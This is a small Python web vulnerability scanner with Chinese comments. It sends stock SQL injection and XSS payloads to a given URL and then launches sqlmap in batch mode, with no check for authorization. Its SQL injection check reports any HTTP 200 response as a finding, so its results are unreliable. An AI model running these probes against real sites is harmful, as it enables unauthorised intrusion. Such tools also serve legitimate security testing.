import requests
import subprocess
import sys

# 简易Web漏洞扫描工具：检测SQL注入、XSS漏洞，调用sqlmap深度扫描
# 常用漏洞测试Payload
sql_payload_list = [
    "'",
    "1' OR 1=1#",
    "' AND SLEEP(3)#"
]

xss_payload_list = [
    '<script>alert("xss")</script>',
    '"><img src=x onerror=alert(1)>'
]

def vul_scan(target_url):
    print("===== 开始基础漏洞扫描 =====")
    # SQL注入探测
    for payload in sql_payload_list:
        test_url = target_url + payload
        try:
            resp = requests.get(test_url, timeout=6)
            if resp.status_code == 200:
                print(f"【疑似SQL注入漏洞】载荷：{payload}")
        except Exception:
            continue

    # XSS跨站脚本探测
    for payload in xss_payload_list:
        test_url = target_url + payload
        try:
            resp = requests.get(test_url, timeout=6)
            if payload in resp.text:
                print(f"【疑似XSS漏洞】载荷：{payload}")
        except Exception:
            continue

    # 调用sqlmap进行深度扫描
    print("\n===== 调用Sqlmap深度扫描 =====")
    try:
        cmd = ["python", "sqlmap.py", "-u", target_url, "--batch"]
        # 把下面路径换成你电脑sqlmap文件夹路径
        subprocess.run(cmd, cwd=r"D:\sqlmap1.1.5")
    except Exception:
        print("未找到Sqlmap，请检查路径配置")

if __name__ == "__main__":
    if len(sys.argv) == 3 and sys.argv[1] == "-u":
        vul_scan(sys.argv[2])
    else:
        print("使用格式：python scan.py -u 目标网址")